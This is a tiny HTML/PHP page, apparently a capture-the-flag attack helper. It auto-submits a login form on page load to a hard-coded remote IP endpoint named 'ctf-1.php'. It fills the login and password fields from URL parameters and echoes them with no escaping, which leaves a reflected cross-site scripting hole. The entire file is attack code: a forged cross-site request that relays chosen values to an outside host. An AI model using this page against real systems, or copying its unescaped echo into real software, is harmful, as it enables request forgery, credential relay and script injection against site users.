<!DOCTYPE html>
<html>
<head>
	<title>Our panel</title>
</head>
<body onLoad="document.forms[0].submit();">
				<form method="POST" action="http://40.118.42.10:18888/ctf-1.php">
				<label for="login">Login: </label><input type="text" value="<?php echo urldecode($_GET['login']); ?>" name="login" id="login"><br>
				<label for="password">Password: </label><input type="password" value="<?php echo urldecode($_GET['password']); ?>" name="password" id="pasword"><br>
			</form>
			</body>
</html>